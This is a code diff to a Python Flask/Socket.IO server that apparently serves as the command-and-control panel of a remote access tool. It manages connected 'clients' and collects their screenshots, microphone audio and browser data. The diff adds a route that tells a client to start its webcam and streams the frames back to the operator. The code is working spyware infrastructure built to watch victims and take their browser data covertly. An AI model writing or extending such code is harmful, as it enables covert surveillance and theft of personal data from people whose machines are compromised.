@@ -2,19 +2,19 @@ import base64
 import json
 import os
 import threading
-from datetime import datetime, time
+from datetime import datetime
+from queue import Queue
 
 from flask import Flask, request, send_file, Response
 from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
 from flask_restx import Api, Resource, fields
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO
 
 from client.media_utils import gen_frames
 from config.config import Config
 from config.extensions import db
 from models import Client, Command, CommandType
-from queue import Queue
 
 app = Flask(__name__)
 app.config.from_object(Config)
@@ -43,6 +43,7 @@ clients_ns = api.namespace('api/v1/clients', description='Client operations')
 screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
+webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -212,6 +213,20 @@ class GetBrowserDataFile(Resource):
             return {'status': 'error', 'message': 'Fichier de données du navigateur non trouvé.'}, 404
 
 
+@webcam_ns.route('/<int:client_id>')
+class StreamWebcam(Resource):
+    def get(self, client_id):
+        client = Client.query.get(client_id)
+        if not client:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
+        if client.status == 'offline':
+            return {'status': 'error', 'message': 'Client hors ligne.'}, 400
+
+        socketio.emit('start_stream', room=client.sid)
+        threading.Thread(target=gen_frames, args=(socketio,)).start()
+        return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -297,6 +312,12 @@ def handle_browser_data(data):
         db.session.commit()
 
 
+@socketio.on('webcam_response')
+def handle_frame(data):
+    frame_data = base64.b64decode(data.get('data'))
+    video_frames.put(frame_data)
+
+
 @socketio.on('disconnect')
 def handle_disconnect():
     sid = request.sid
@@ -306,25 +327,12 @@ def handle_disconnect():
         client.date_updated = datetime.now()
         db.session.commit()
 
-@socketio.on('video_frame')
-def handle_frame(data):
-    frame_data = base64.b64decode(data['data'])
-    video_frames.put(frame_data)
-
-@app.route('/video_feed/<int:client_id>')
-def video_feed(client_id):
-    # Vous pouvez ici ajouter une authentification ou des contrôles spécifiques au client
-    return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
 
 def stream_frames():
     while True:
-        if not video_frames.empty():
-            frame_data = video_frames.get()
-            yield (b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
-        else:
-            time.sleep(0.05)
+        frame_data = video_frames.get()
+        yield (b'--frame\r\n'
+               b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
 
 
 if __name__ == '__main__':
